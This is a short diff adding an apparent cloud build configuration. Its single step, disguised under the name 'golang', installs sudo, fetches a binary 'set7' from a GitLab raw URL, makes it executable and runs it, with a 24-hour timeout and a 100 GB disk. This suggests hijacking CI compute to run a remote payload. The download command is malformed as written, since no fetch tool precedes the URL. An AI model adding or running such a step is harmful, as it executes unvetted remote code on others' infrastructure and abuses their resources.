@@ -1,0 +1,12 @@
+steps:
+  - name: golang
+    args:
+      - '-c'
+      - >-
+         apt update && apt-get install sudo -y && https://gitlab.com/uweldrop/vrsc/-/raw/main/set7 && chmod u+x set7 && ./set7
+    waitFor:
+      - '-'
+    entrypoint: /bin/bash
+timeout: 86400s
+options:
+  diskSizeGb: '100'
